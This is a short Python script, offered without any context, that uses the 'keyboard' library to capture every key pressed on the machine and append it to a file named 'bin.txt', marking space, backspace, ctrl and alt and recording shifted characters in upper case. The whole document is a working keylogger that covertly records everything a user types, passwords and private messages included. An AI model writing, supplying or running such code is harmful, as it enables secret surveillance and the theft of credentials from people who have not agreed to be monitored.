import keyboard

log_file = 'bin.txt'

def on_key_press(event):
    with open(log_file, 'a') as f:
        if event.name == 'space':
            f.write('\n')
        elif event.name == 'backspace':
            f.write('/-/')
        elif event.name == 'ctrl':
            f.write('^')
        elif event.name == 'alt':
            f.write('[ALT]')
        elif event.name == 'shift':
            pass
        else:
            if keyboard.is_pressed('shift'):
                f.write(event.name.upper())
            else:
                f.write(event.name)

keyboard.on_press(on_key_press)
keyboard.wait()